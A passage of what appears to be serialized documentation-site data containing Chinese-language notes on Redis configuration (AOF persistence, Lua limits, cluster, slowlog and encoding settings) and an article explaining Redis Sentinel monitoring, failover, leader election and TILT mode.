的持久化存储提供两种方式：rdb 与 aof。rdb 是默认配置。aof 需要手动开启。\n现在 redis 的配置中默认是关闭 aof 模式的。\n\n\n# appendonly\n\nappendonly no\n\n\n1\n\n\n是否开启 aof\n\n\n# appendfilename\n\nappendfilename "appendonly.aof"\n\n\n1\n\n\n保存数据的 aof 文件名称\n\n\n# appendfsync\n\n# appendfsync always\nappendfsync everysec\n# appendfsync no\n\n\n1\n2\n3\n\n\nredis 支持 3 种不同的模式：\n\n * no：不即时同步，由操作系统控制何时刷写到磁盘上，这种模式速度最快；\n * always：每次只写日志，速度较慢，但最安全；\n * everysec：每秒钟同步一次，折中的方案。\n\n\n# no-appendfsync-on-rewrite\n\nno-appendfsync-on-rewrite no\n\n\n1\n\n\n当使用 aof 的 appendfsync 设置为 always 或 everysec 时，后台的存储进程会执行大量的磁盘 i/o 操作，在一些 linux 架构中，redis fsync () 调用时可能会阻塞很久。这个问题当前并没有修复，即使是在一个不同的线程执行 fsync 也会阻塞我们的同步写调用。\n\n为了缓解这个问题，可以使用以下选项，它将会在有一个 bgsave 或 bgrewriteaof 正在运行时，阻止主进程调用 fsync ()。\n\n这意味着有另一个子进程在存储时，redis 的持久性等同于 appendfsync no。在实践中，意味着在最坏的情况下它可能丢失多达 30 秒的日志（默认的 linux 设置）。\n\n如果你有潜在的问题需要更改它为 “yes”。否则从持久性的观点来看 “no” 是最安全的选择。\n\n\n# auto-aof-rewrite-percentage auto-aof-rewrite-min-size\n\nauto-aof-rewrite-percentage 100\n\n\n1\n\n\naof 文件增长比例，指当前 aof 文件比上次重写的增长比例大小。aof 重写即在 aof 文件在一定大小之后，重新将整个内存写到 aof 文件当中，以反映最新的状态 (相当于 bgsave)。这样就避免了，aof 文件过大而实际内存数据小的问题 (频繁修改数据问题).\n\n\n# auto-aof-rewrite-min-size\n\nauto-aof-rewrite-min-size 64mb\n\n\n1\n\n\naof 文件重写最小的文件大小，即最开始 aof 文件必须要达到这个文件时才触发，后面的每次重写就不会根据这个变量了 (根据上一次重写完成之后的大小). 此变量仅初始化启动 redis 有效。如果是 redis 恢复时，则 lastsize 等于初始 aof 文件大小。\n\n# rewrite 机制\n\n其实 redis oaf 机制包括了两件事，rewrite 和 aof。rewrite 类似于普通数据库管理系统日志恢复点，当 aof 文件随着写命令的运行膨胀时，当文件大小触碰到临界时，rewrite 会被运行。\n\nrewrite 会像复制一样，fork 出一个子进程，创建一个临时文件，遍历数据库，将每个 key、value 对输出到临时文件。输出格式就是 redis 的命令，但是为了减小文件大小，会将多个 key、value 对集合整理用一条命令表达。在 rewrite 期间的写操作会保存在内存的 rewrite buffer 中，rewrite 成功后这些操作也会复制到临时文件中，在最后临时文件会代替 aof 文件。\n\n简单来说：aof 里存放了所有的 redis 操作指令，当 aof 文件达到一定条件或者手动 bgrewriteaof 命令都可以触发 rewrite。rewrite 之后 aof 文件会保存 keys 的最后的状态，清除掉之前冗余的，来缩小这个文件。这里所谓的缩小就是 整理指令 ，比如客户端发送过三个命令：\n\nlpush key 1 2 3\n# 移出左边第一个元素，也就是把上面的元素 1 移出\nlpop key \nlpush key 4 5 6\n\n\n1\n2\n3\n4\n\n\n整理后的指令文件是\n\nlpush key 4 5 6 2 3\n\n\n1\n\n\n\n# aof-load-truncated\n\naof-load-truncated yes\n\n\n1\n\n\n指 redis 在恢复时，会忽略最后一条可能存在问题的指令。默认值 yes。即在 aof 写入时，可能存在指令写错的问题 (突然断电，写了一半)，这种情况下，yes 会 log 并继续，而 no 会直接恢复失败.\n\n\n# aof-use-rdb-preamble\n\naof-use-rdb-preamble yes\n\n\n1\n\n\n混合持久化同样也是通过 bgrewriteaof 完成的，不同的是当开启混合持久化时，fork 出的子进程先将共享的内存副本全量的以 rdb 方式写入 aof 文件，然后在将重写缓冲区的增量命令以 aof 方式写入到文件，写入完成后通知主进程更新统计信息，并将新的含有 rdb 格式和 aof 格式的 aof 文件替换旧的的 aof 文件。简单的说：新的 aof 文件前半段是 rdb 格式的全量数据后半段是 aof 格式的增量数据。\n\n\n# lua scripting lua 脚本\n\nredis 提供了 lua 脚本功能来让用户实现自己的原子命令，但也存在着风险，编写不当的脚本可能阻塞线程导致整个 redis 服务不可用。\n\nlua-time-limit 5000\n\n\n1\n\n\nredis 的配置文件中提供了如下配置项来规定最大执行时长。\n\n但这里有个坑，当一个脚本达到最大执行时长的时候，redis 并不会强制停止脚本的运行，仅仅在日志里打印个警告，告知有脚本超时。\n\n因为 redis 必须保证脚本执行的原子性，中途停止可能导致内存的数据集上只修改了部分数据。\n\n如果时长达到 lua-time-limit 规定的最大执行时间，redis 只会做这几件事情：\n\n * 日志记录有脚本运行超时\n * 开始允许接受其他客户端请求，但仅限于 script kill 和 shutdown nosave 两个命令\n * 其他请求仍返回 busy 错误\n\n\n# - cluster 集群\n\ncluster-enabled yes\n\n\n1\n\n\n开启集群模式\n\ncluster-config-file nodes-6379.conf\n\n\n1\n\n\n1、这个配置文件不是要我们去配的，而是 redis 运行时保存配置的文件，所以我们也不可以修改这个文件。\n\n2、redis 集群节点每次发生更改时自动保留集群配置（基本上为状态）的文件，以便能够 在启动时重新读取它。\n\n3、该文件列出了集群中其他节点，它们的状态，持久变量等等信息。 由于某些消息的接收，通常会将此文件重写并刷新到磁盘上。\n\n4、生成的文件在 dir 指定路径下\n\ncluster-node-timeout 15000\n\n\n1\n\n\n超时时间是集群中各节点相互通讯时，允许 "失联" 的最大毫秒数，上面的配置为 15 秒，如果超过 15 秒某个节点没向其它节点汇报成功，认为该节点挂了。\n\ncluster-replica-validity-factor 10\n\n\n1\n\n\n1、如果设置为 0，无论主节点和从节点之间的链路断开连接的时间长短，从节点都将尝试故障切换为主节点。\n\n2、 如果该值为正值，则计算最大断开时间作为节点超时值乘以此选项提供的系数，如果该节点是从节点，则在主链路断开连接的时间超过指定的超时值时，它不会尝试启动故障切换。 例如，如果节点超时设置为 5 秒，并且有效因子设置为 10，则与主节点断开连接超过 50 秒的从节点将不会尝试对其主节点进行故障切换。\n\n3、请注意，如果没有从服务器节点能够对其进行故障转移，则任何非零值都可能导致 redis 集群在主服务器出现故障后不可用。 在这种情况下，只有原始主节点重新加入集群时，集群才会返回可用。\n\ncluster-migration-barrier 1\n\n\n1\n\n\n主节点将保持连接的最小从节点数量，以便另一个从节点迁移到不受任何从节点覆盖的主节点。\n\ncluster-require-full-coverage yes\n\n\n1\n\n\n当 cluster-require-full-coverage 为 no 时，表示当负责一个插槽的主库下线且没有相应的从库进行故障恢复时，集群仍然可用。\n\n当 cluster-require-full-coverage 为 yes 时，表示当负责一个插槽的主库下线且没有相应的从库进行故障恢复时，集群不可用。\n\ncluster-replica-no-failover no\n\n\n1\n\n\n设置为 yes 时，此选项可防止从服务器在主服务器故障期间尝试对主服务器进行故障转移。但是，主服务器仍然可以执行手动故障转移（如果被迫执行）。\n\ncluster-allow-reads-when-down no\n\n\n1\n\n\n默认为 no, 表示当集群因主节点数量达不到最小值或有散列槽没有分配而被标记为失效时，节点将停止所有的客户端通讯。 这样可以避免从一个不知道集群状态变化的节点读到不一致数据的危险。 设为 yes 则允许集群失效时仍可以由节点中读取数据。 这样既保证读操作的高可用性， 也避免不一致写操作，同时当 redis cluster 仅包含 1 至 2 个节点，而某个节点失效后无可用从节点替代，且因节点数量不足，无法自动重新分配散列槽，则该参数设为 yes 可保证节点仍然可执行读操作。\n\n\n# slow log 慢日志\n\nslowlog-log-slower-than 1000\n\n\n1\n\n\n其中 slowlog-log-slower-than 表示 slowlog 的划定界限，只有 query 执行时间大于 slowlog-log-slower-than 的才会定义成慢查询，才会被 slowlog 进行记录。slowlog-log-slower-than 设置的单位是微妙，默认是 10000 微妙，也就是 10ms\n\nslowlog-max-len 128\n\n\n1\n\n\nslowlog-max-len 表示慢查询最大的条数，当 slowlog 超过设定的最大值后，会将最早的 slowlog 删除，是个 fifo 队列\n\n\n# latency monitor 延迟监视器\n\nlatency-monitor-threshold 0\n\n\n1\n\n\nredis 延时监控系统在运行时会采样一些操作，以便收集可能导致延时的数据根源。\n通过 latency 命令 可以打印一些图样和获取一些报告，方便监控\n这个系统仅仅记录那个执行时间大于或等于预定时间（毫秒）的操作，\n这个预定时间是通过 latency-monitor-threshold 配置来指定的，\n当设置为 0 时，这个监控系统处于停止状态\n\n\n# event notification 事件通知\n\nnotify-keyspace-events ""\n\n\n1\n\n\n\n# advanced config 高级配置\n\n当哈希条目只有少量条目且最大条目未超过给定阈值时，将使用内存高效的数据结构对其进行编码\n\nhash-max-ziplist-entries 512\n\n\n1\n\n\n数据量小于等于 hash-max-ziplist-entries 的用 ziplist，大于 hash-max-ziplist-entries 用 hash\n\nhash-max-ziplist-value 64\n\n\n1\n\n\nvalue 大小小于等于 hash-max-ziplist-value 的用 ziplist，大于 hash-max-ziplist-value 用 hash。',charsets:{cjk:!0}},{title:"Redis高可用(二) 哨兵理论",frontmatter:{title:"Redis高可用(二) 哨兵理论",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1608",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1608.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%BA%8C)%20%E5%93%A8%E5%85%B5%E7%90%86%E8%AE%BA.html",relativePath:"02.中间件/03.redis/1608.Redis高可用(二) 哨兵理论.md",key:"v-146c1cb3",path:"/Redis/1608/",headers:[{level:2,title:"简介",slug:"简介",normalizedTitle:"简介",charIndex:2},{level:2,title:"每个 Sentinel 都需要定期执行的任务",slug:"每个-sentinel-都需要定期执行的任务",normalizedTitle:"每个 sentinel 都需要定期执行的任务",charIndex:776},{level:2,title:"自动发现 Sentinel 和从服务器",slug:"自动发现-sentinel-和从服务器",normalizedTitle:"自动发现 sentinel 和从服务器",charIndex:1479},{level:2,title:"故障转移",slug:"故障转移",normalizedTitle:"故障转移",charIndex:716},{level:2,title:"Sentinel 自动故障迁移的一致性特质",slug:"sentinel-自动故障迁移的一致性特质",normalizedTitle:"sentinel 自动故障迁移的一致性特质",charIndex:3371},{level:2,title:"Sentinel 状态的持久化",slug:"sentinel-状态的持久化",normalizedTitle:"sentinel 状态的持久化",charIndex:4032},{level:2,title:"Sentinel 在非故障迁移的情况下对实例进行重新配置",slug:"sentinel-在非故障迁移的情况下对实例进行重新配置",normalizedTitle:"sentinel 在非故障迁移的情况下对实例进行重新配置",charIndex:4205},{level:2,title:"TILT 模式",slug:"tilt-模式",normalizedTitle:"tilt 模式",charIndex:4560},{level:2,title:"Sentinel 命令",slug:"sentinel-命令",normalizedTitle:"sentinel 命令",charIndex:5287}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"简介 每个 Sentinel 都需要定期执行的任务 自动发现 Sentinel 和从服务器 故障转移 Sentinel 自动故障迁移的一致性特质 Sentinel 状态的持久化 Sentinel 在非故障迁移的情况下对实例进行重新配置 TILT 模式 Sentinel 命令",content:"# 简介\n\nRedis 的 Sentinel 系统用于管理多个 Redis 服务器， 该系统执行以下三个任务：\n\n * 监控（Monitoring）： Sentinel 会不断地检查你的 master 和 slave 是否运作正常。\n * 提醒（Notification）： 当被监控的某个 Redis 服务器出现问题时， Sentinel 可以通过 API 向管理员或者其他应用程序发送通知。\n * 自动故障迁移（Automatic failover）： 当一个 master 不能正常工作时， Sentinel 会开始一次自动故障迁移操作， 它会将失效 master 的其中一个 slave 升级为新的 master， 并让失效 master 的其他 slave 改为复制新的 master； 当客户端试图连接失效的 master 时， 集群也会向客户端返回新 master 的地址， 使得集群可以使用新 master 代替失效服务器。\n\n\n\n在默认情况下， Sentinel 使用 TCP 端口 26379 （普通 Redis 服务器使用的是 6379 ）。\n\nSentinel 接受 Redis 协议格式的命令请求， 所以你可以使用 redis-cli 或者任何其他 Redis 客户端来与 Sentinel 进行通讯。\n\n有两种方式可以和 Sentinel 进行通讯：\n\n * 第一种方法是通过直接发送命令来查询被监视 Redis 服务器的当前状态， 以及 Sentinel 所知道的关于其他 Sentinel 的信息， 诸如此类。\n * 另一种方法是使用发布与订阅功能， 通过接收 Sentinel 发送的通知： 当执行故障转移操作， 或者某个被监视的服务器被判断为主观下线或者客观下线时， Sentinel 就会发送相应的信息。\n\n\n# 每个 Sentinel 都需要定期执行的任务\n\n每个 Sentinel 以每秒钟一次的频率向它所知的 master 、slave 以及其他 Sentinel 实例发送一个 PING 命令。\n\n如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 选项所指定的值， 那么这个实例会被 Sentinel 标记为主观下线。 一个有效回复可以是： +PONG 、 -LOADING 或者 -MASTERDOWN 。\n\n如果一个 master 被标记为主观下线， 那么正在监视这个 master 的所有 Sentinel 要以每秒一次的频率确认 master 的确进入了主观下线状态。\n\n如果一个 master 被标记为主观下线， 并且有足够数量的 Sentinel （至少要达到配置文件指定的数量）在指定的时间范围内同意这一判断， 那么这个 master 被标记为客观下线。\n\n在一般情况下， 每个 Sentinel 会以每 10 秒一次的频率向它已知的所有 master 和 slave 发送 INFO 命令。 当一个 master 被 Sentinel 标记为客观下线时， Sentinel 向下线 master 的所有 slave 发送 INFO 命令的频率会从 10 秒一次改为每秒一次。\n\n当没有足够数量的 Sentinel 同意 master 已经下线， master 的客观下线状态就会被移除。 当 master 重新向 Sentinel 的 PING 命令返回有效回复时， master 的主观下线状态就会被移除。\n\n\n# 自动发现 Sentinel 和从服务器\n\n一个 Sentinel 可以与其他多个 Sentinel 进行连接， 各个 Sentinel 之间可以互相检查对方的可用性， 并进行信息交换。\n\n你无须为运行的每个 Sentinel 分别设置其他 Sentinel 的地址， 因为 Sentinel 可以通过发布与订阅功能来自动发现正在监视相同 master 的其他 Sentinel ， 这一功能是通过向频道 sentinel:hello 发送信息来实现的。\n\n与此类似， 你也不必手动列出 master 属下的所有 slave ， 因为 Sentinel 可以通过询问 master 来获得所有 slave 的信息。\n\n每个 Sentinel 会以每两秒一次的频率， 通过发布与订阅功能， 向被它监视的所有 master 和 slave 的 sentinel:hello 频道发送一条信息， 信息中包含了 Sentinel 的 IP 地址、端口号和运行 ID （runid）。\n\n每个 Sentinel 都订阅了被它监视的所有 master 和 slave 的 sentinel:hello 频道， 查找之前未出现过的 sentinel （looking for unknown sentinels）。 当一个 Sentinel 发现一个新的 Sentinel 时， 它会将新的 Sentinel 添加到一个列表中， 这个列表保存了 Sentinel 已知的， 监视同一个 master 的所有其他 Sentinel 。\n\nSentinel 发送的信息中还包括完整的 master 当前配置（configuration）。 如果一个 Sentinel 包含的 master 配置比另一个 Sentinel 发送的配置要旧， 那么这个 Sentinel 会立即升级到新配置上。\n\n在将一个新 Sentinel 添加到监视 master 的列表上面之前， Sentinel 会先检查列表中是否已经包含了和要添加的 Sentinel 拥有相同运行 ID 或者相同地址（包括 IP 地址和端口号）的 Sentinel ， 如果是的话， Sentinel 会先移除列表中已有的那些拥有相同运行 ID 或者相同地址的 Sentinel ， 然后再添加新 Sentinel 。\n\n\n# 故障转移\n\n一次故障转移操作由以下步骤组成：\n\n * 发现 master 已经进入客观下线状态。\n * 对我们的当前 epoch 值进行自增， 并尝试在这个 epoch 值中当选。\n * 如果当选失败， 那么在设定的故障迁移超时时间的两倍之后， 重新尝试当选。 如果当选成功， 那么执行以下步骤。\n * 选出一个 slave，并将它升级为 master。\n * 向被选中的 slave 发送  SLAVEOF NO ONE  命令，让它转变为 master。\n * 通过发布与订阅功能， 将更新后的配置传播给所有其他 Sentinel ， 其他 Sentinel 对它们自己的配置进行更新。\n * 向已下线 master 的 slave 发送 SLAVEOF 命令， 让它们去复制新的 master。\n * 当所有 slave 都已经开始复制新的 master 时， 领头 Sentinel 终止这次故障迁移操作。\n\n每当一个 Redis 实例被重新配置（reconfigured） —— 无论是被设置成 master、slave、又或者被设置成其他 master 的 slave —— Sentinel 都会向被重新配置的实例发送一个 CONFIG REWRITE 命令， 从而确保这些配置会持久化在硬盘里。\n\nSentinel 使用以下规则来选择新的 master：\n\n * 在失效 master 属下的 slave 当中， 那些被标记为主观下线、已断线、或者最后一次回复 PING 命令的时间大于五秒钟的 slave 都会被淘汰。\n * 在失效 master 属下的 slave 当中， 那些与失效 master 连接断开的时长超过 down-after 选项指定的时长十倍的 slave 都会被淘汰。\n * 在经历了以上两轮淘汰之后剩下来的 slave 中， 我们选出复制偏移量（replication offset）最大的那个 slave 作为新的 master； 如果复制偏移量不可用， 或者 slave 的复制偏移量相同， 那么带有最小运行 ID 的那个 slave 成为新的 master。\n\n\n# Sentinel 自动故障迁移的一致性特质\n\nSentinel 自动故障迁移使用 Raft 算法来选举 leader（组长）Sentinel ， 从而确保在一个给定的 epoch 值里， 只有一个 leader 产生。\n\n这表示在同一个 epoch 值中， 不会有两个 Sentinel 同时被选中为 leader， 并且各个 Sentinel 在同一个 epoch 值中只会对一个 leader 进行投票。\n\n更高的配置 epoch 值总是优于较低的 epoch 值， 因此每个 Sentinel 都会主动使用更新的 epoch 值来代替自己的配置。\n\n简单来说， 我们可以将 Sentinel 配置看作是一个带有版本号的状态。 一个状态会以最后写入者胜出（last-write-wins）的方式（也即是，最新的配置总是胜出）传播至所有其他 Sentinel 。\n\n举个例子， 当出现网络分割（network partitions）时， 一个 Sentinel 可能会包含了较旧的配置， 而当这个 Sentinel 接到其他 Sentinel 发来的版本更新的配置时， Sentinel 就会对自己的配置进行更新。\n\n如果要在网络分割出现的情况下仍然保持一致性， 那么应该使用 min-slaves-to-write 选项， 让 master 在连接的从实例少于给定数量时停止执行写操作， 与此同时， 应该在每个运行 Redis master 或 slave 的机器上运行 Redis Sentinel 进程。\n\n\n# Sentinel 状态的持久化\n\nSentinel 的状态会被持久化在 Sentinel 配置文件里面。\n\n每当 Sentinel 接收到一个新的配置， 或者当组长 Sentinel 为 master 创建一个新的配置时， 这个配置会与配置 epoch 值一起被保存到磁盘里面。\n\n这意味着停止和重启 Sentinel 进程都是安全的。\n\n\n# Sentinel 在非故障迁移的情况下对实例进行重新配置\n\n即使没有自动故障迁移操作在进行， Sentinel 总会尝试将当前的配置设置到被监视的实例上面。 特别是：根据当前的配置， 如果一个 slave 被宣告为 master， 那么它会代替原有的 master， 成为新的 master， 并且成为原有 master 的所有 slave 的复制对象。 那些连接了错误 master 的 slave 会被重新配置， 使得这些 slave 会去复制正确的 master。\n\n不过， 在以上这些条件满足之后， Sentinel 在对实例进行重新配置之前仍然会等待一段足够长的时间， 确保可以接收到其他 Sentinel 发来的配置更新， 从而避免自身因为保存了过期的配置而对实例进行了不必要的重新配置。\n\n\n# TILT 模式\n\nRedis Sentinel 严重依赖计算机的时间功能： 比如说， 为了判断一个实例是否可用， Sentinel 会记录这个实例最后一次相应 PING 命令的时间， 并将这个时间和当前时间进行对比， 从而知道这个实例有多长时间没有和 Sentinel 进行任何成功通讯。\n\n不过， 一旦计算机的时间功能出现故障， 或者计算机非常忙碌， 又或者进程因为某些原因而被阻塞时， Sentinel 可能也会跟着出现故障。\n\nTILT 模式是一种特殊的保护模式： 当 Sentinel 发现系统有些不对劲时， Sentinel 就会进入 TILT 模式。\n\n因为 Sentinel 的时间中断器默认每秒执行 10 次， 所以我们预期时间中断器的两次执行之间的间隔为 100 毫秒左右。 Sentinel 的做法是， 记录上一次时间中断器执行时的时间， 并将它和这一次时间中断器执行的时间进行对比：\n\n如果两次调用时间之间的差距为负值， 或者非常大（超过 2 秒钟）， 那么 Sentinel 进入 TILT 模式。\n如果 Sentinel 已经进入 TILT 模式， 那么 Sentinel 延迟退出 TILT 模式的时间。\n\n当 Sentinel 进入 TILT 模式时， 它仍然会继续监视所有目标， 但是：它不再执行任何操作，比如故障转移。当有实例向这个 Sentinel 发送 SENTINEL is-master-down-by-addr 命令时， Sentinel 返回负值： 因为这个 Sentinel 所进行的下线判断已经不再准确。如果 TILT 可以正常维持 30 秒钟， 那么 Sentinel 退出 TILT 模式。\n\n\n# Sentinel 命令\n\n以下列出的是 Sentinel 接受的命令：\n\n命令                                 描述\nPING                               如果后面没有参数时返回\n                                   PONG，否则会返回后面带的参数。这个命令经常用来测试一个连接是否还是可用的，或者用来测试一个连接的延时。如果客户端处于频道订阅模式下，它将是一个\n                                   multi-bulk 返回，第一次时返回”pong”，之后返回空（empty bulk），除非命令后面更随了参数。\nSENTINEL masters                   列出所有被监视的 master，以及这些 master 的当前状态。\nSENTINEL slaves                    列出给定 master 的所有 slave ，以及这些 slave 的当前状态\nSENTINEL get-master-addr-by-name   返回给定名字的 master 的 IP 地址和端口号。 如果这个 master 正在执行故障转移操作， 或者针对这个\n                                   master 的故障转移操作已经完成， 那么这个命令返回新的 master 的 IP 地址和端口号\nSENTINEL reset                     重置所有名字和给定模式 pattern 相匹配的 master 。 pattern 参数是一个 Glob 风格的模式。\n                                   重置操作清楚 master 目前的所有状态， 包括正在执行中的故障转移， 并移除目前已经发现和关联的， master\n                                   的所有 slave 和 Sentinel\nSENTINEL failover                  当 master 失效时， 在不询问其他 Sentinel 意见的情况下， 强制开始一次自动故障迁移\n                                   （不过发起故障转移的 Sentinel 会向其他 Sentinel 发送一个新的配置，其他 Sentinel\n                                   会根据这个配置进行相应的更新）",normalizedContent:"# 简介\n\nredis 的 sentinel 系统用于管理多个 redis 服务器， 该系统执行以下三个任务：\n\n * 监控（monitoring）： sentinel 会不断地检查你的 master 和 slave 是否运作正常。\n * 提醒（notification）： 当被监控的某个 redis 服务器出现问题时， sentinel 可以通过 api 向管理员或者其他应用程序发送通知。\n * 自动故障迁移（automatic failover）： 当一个 master 不能正常工作时， sentinel 会开始一次自动故障迁移操作， 它会将失效 master 的其中一个 slave 升级为新的 master， 并让失效 master 的其他 slave 改为复制新的 master； 当客户端试图连接失效的 master 时， 集群也会向客户端返回新 master 的地址， 使得集群可以使用新 master 代替失效服务器。\n\n\n\n在默认情况下， sentinel 使用 tcp 端口 26379 （普通 redis 服务器使用的是 6379 ）。\n\nsentinel 接受 redis 协议格式的命令请求， 所以你可以使用 redis-cli 或者任何其他 redis 客户端来与 sentinel 进行通讯。\n\n有两种方式可以和 sentinel 进行通讯：\n\n * 第一种方法是通过直接发送命令来查询被监视 redis 服务器的当前状态， 以及 sentinel 所知道的关于其他 sentinel 的信息， 诸如此类。\n * 另一种方法是使用发布与订阅功能， 通过接收 sentinel 发送的通知： 当执行故障转移操作， 或者某个被监视的服务器被判断为主观下线或者客观下线时， sentinel 就会发送相应的信息。\n\n\n# 每个 sentinel 都需要定期执行的任务\n\n每个 sentinel 以每秒钟一次的频率向它所知的 master 、slave 以及其他 sentinel 实例发送一个 ping 命令。\n\n如果一个实例（instance）距离最后一次有效回复 ping 命令的时间超过 down-after-milliseconds 选项所指定的值， 那么这个实例会被 sentinel 标记为主观下线。 一个有效回复可以是： +pong 、 -loading 或者 -masterdown 。\n\n如果一个 master 被标记为主观下线， 那么正在监视这个 master 的所有 sentinel 要以每秒一次的频率确认 master 的确进入了主观下线状态。\n\n如果一个 master 被标记为主观下线， 并且有足够数量的 sentinel （至少要达到配置文件指定的数量）在指定的时间范围内同意这一判断， 那么这个 master 被标记为客观下线。\n\n在一般情况下， 每个 sentinel 会以每 10 秒一次的频率向它已知的所有 master 和 slave 发送 info 命令。 当一个 master 被 sentinel 标记为客观下线时， sentinel 向下线 master 的所有 slave 发送 info 命令的频率会从 10 秒一次改为每秒一次。\n\n当没有足够数量的 sentinel 同意 master 已经下线， master 的客观下线状态就会被移除。 当 master 重新向 sentinel 的 ping 命令返回有效回复时， master 的主观下线状态就会被移除。\n\n\n# 自动发现 sentinel 和从服务器\n\n一个 sentinel 可以与其他多个 sentinel 进行连接， 各个 sentinel 之间可以互相检查对方的可用性， 并进行信息交换。\n\n你无须为运行的每个 sentinel 分别设置其他 sentinel 的地址， 因为 sentinel 可以通过发布与订阅功能来自动发现正在监视相同 master 的其他 sentinel ， 这一功能是通过向频道 sentinel:hello 发送信息来实现的。\n\n与此类似， 你也不必手动列出 master 属下的所有 slave ， 因为 sentinel 可以通过询问 master 来获得所有 slave 的信息。\n\n每个 sentinel 会以每两秒一次的频率， 通过发布与订阅功能， 向被它监视的所有 master 和 slave 的 sentinel:hello 频道发送一条信息， 信息中包含了 sentinel 的 ip 地址、端口号和运行 id （runid）。\n\n每个 sentinel 都订阅了被它监视的所有 master 和 slave 的 sentinel:hello 频道， 查找之前未出现过的 sentinel （looking for unknown sentinels）。 当一个 sentinel 发现一个新的 sentinel 时， 它会将新的 sentinel 添加到一个列表中， 这个列表保存了 sentinel 已知的， 监视同一个 master 的所有其他 sentinel 。\n\nsentinel 发送的信息中还包括完整的 master 当前配置（configuration）。 如果一个 sentinel 包含的 master 配置比另一个 sentinel 发送的配置要旧， 那么这个 sentinel 会立即升级到新配置上。\n\n在将一个新 sentinel 添加到监视 master 的列表上面之前， sentinel 会先检查列表中是否已经包含了和要添加的 sentinel 拥有相同运行 id 或者相同地址（包括 ip 地址和端口号）的 sentinel ， 如果是的话， sentinel 会先移除列表中已有的那些拥有相同运行 id 或者相同地址的 sentinel ， 然后再添加新 sentinel 。\n\n\n# 故障转移\n\n一次故障转移操作由以下步骤组成：\n\n * 发现 master 已经进入客观下线状态。\n * 对我们的当前 epoch 值进行自增， 并尝试在这个 epoch 值中当选。\n * 如果当选失败， 那么在设定的故障迁移超时时间的两倍之后， 重新尝试当选。 如果当选成功， 那么执行以下步骤。\n * 选出一个 slave，并将它升级为 master。\n * 向被选中的 slave 发送  slaveof no one  命令，让它转变为 master。\n * 通过发布与订阅功能， 将更新后的配置传播给所有其他 sentinel ， 其他 sentinel 对它们自己的配置进行更新。\n * 向已下线 master 的 slave 发送 slaveof 命令， 让它们去复制新的 master。\n * 当所有 slave 都已经开始复制新的 master 时， 领头 sentinel 终止这次故障迁移操作。\n\n每当一个 redis 实例被重新配置（reconfigured） —— 无论是被设置成 master、slave、又或者被设置成其他 master 的 slave —— sentinel 都会向被重新配置的实例发送一个 config rewrite 命令， 从而确保这些配置会持久化在硬盘里。\n\nsentinel 使用以下规则来选择新的 master：\n\n * 在失效 master 属下的 slave 当中， 那些被标记为主观下线、已断线、或者最后一次回复 ping 命令的时间大于五秒钟的 slave 都会被淘汰。\n * 在失效 master 属下的 slave 当中， 那些与失效 master 连接断开的时长超过 down-after 选项指定的时长十倍的 slave 都会被淘汰。\n * 在经历了以上两轮淘汰之后剩下来的 slave 中， 我们选出复制偏移量（replication offset）最大的那个 slave 作为新的 master； 如果复制偏移量不可用， 或者 slave 的复制偏移量相同， 那么带有最小运行 id 的那个 slave 成为新的 master。\n\n\n# sentinel 自动故障迁移的一致性特质\n\nsentinel 自动故障迁移使用 raft 算法来选举 leader（组长）sentinel ， 从而确保在一个给定的 epoch 值里， 只有一个 leader 产生。\n\n这表示在同一个 epoch 值中， 不会有两个 sentinel 同时被选中为 leader， 并且各个 sentinel 在同一个 epoch 值中只会对一个 leader 进行投票。\n\n更高的配置 epoch 值总是优于较低的 epoch 值， 因此每个 sentinel 都会主动使用更新的 epoch 值来代替自己的配置。\n\n简单来说， 我们可以将 sentinel 配置看作是一个带有版本号的状态。 一个状态会以最后写入者胜出（last-write-wins）的方式（也即是，最新的配置总是胜出）传播至所有其他 sentinel 。\n\n举个例子， 当出现网络分割（network partitions）时， 一个 sentinel 可能会包含了较旧的配置， 而当这个 sentinel 接到其他 sentinel 发来的版本更新的配置时， sentinel 就会对自己的配置进行更新。\n\n如果要在网络分割出现的情况下仍然保持一致性， 那么应该使用 min-slaves-to-write 选项， 让 master 在连接的从实例少于给定数量时停止执行写操作， 与此同时， 应该在每个运行 redis master 或 slave 的机器上运行 redis sentinel 进程。\n\n\n# sentinel 状态的持久化\n\nsentinel 的状态会被持久化在 sentinel 配置文件里面。\n\n每当 sentinel 接收到一个新的配置， 或者当组长 sentinel 为 master 创建一个新的配置时， 这个配置会与配置 epoch 值一起被保存到磁盘里面。\n\n这意味着停止和重启 sentinel 进程都是安全的。\n\n\n# sentinel 在非故障迁移的情况下对实例进行重新配置\n\n即使没有自动故障迁移操作在进行， sentinel 总会尝试将当前的配置设置到被监视的实例上面。 特别是：根据当前的配置， 如果一个 slave 被宣告为 master， 那么它会代替原有的 master， 成为新的 master， 并且成为原有 master 的所有 slave 的复制对象。 那些连接了错误 master 的 slave 会被重新配置， 使得这些 slave 会去复制正确的 master。\n\n不过， 在以上这些条件满足之后， sentinel 在对实例进行重新配置之前仍然会等待一段足够长的时间， 确保可以接收到其他 sentinel 发来的配置更新， 从而避免自身因为保存了过期的配置而对实例进行了不必要的重新配置。\n\n\n# tilt 模式\n\nredis sentinel 严重依赖计算机的时间功能： 比如说， 为了判断一个实例是否可用， sentinel 会记录这个实例最后一次相应 ping 命令的时间， 并将这个时间和当前时间进行对比， 从而知道这个实例有多长时间没有和 sentinel 进行任何成功通讯。\n\n不过， 一旦计算机的时间功能出现故障， 或者计算机非常忙碌， 又或者进程因为某些原因而被阻塞时， sentinel 可能也会跟着出现故障。\n\ntilt 模式是一种特殊的保护模式： 当 sentinel 发现系统有些不对劲时， sentinel 就会进入 tilt 模式。\n\n因为 sentinel 的时间中断器默认每秒执行 10 次， 所以我们预期时间中断器的两次执行之间的间隔为 100 毫秒左右。 sentinel 的做法是， 记录上一次时间中断器执行时的时间， 并将它和这一次时间中断器执行的时间进行对比：\n\n如果两次调用时间之间的差距为负值， 或者非常大（超过 2 秒钟）， 那么 sentinel 进入 tilt 模式。\n如果 sentinel 已经进入 tilt 模式， 那么 sentinel 延迟退出 tilt 模式的时间。\n\n当 sentinel 进入 tilt 模式时， 它仍然会继续监视所有目标， 但是：它不再执行任何操作，比如故障转移。当有实例向这个 sentinel 发送 sentinel is-master-down-by-addr 命令时， sentinel 返回负值： 因为这个 sentinel 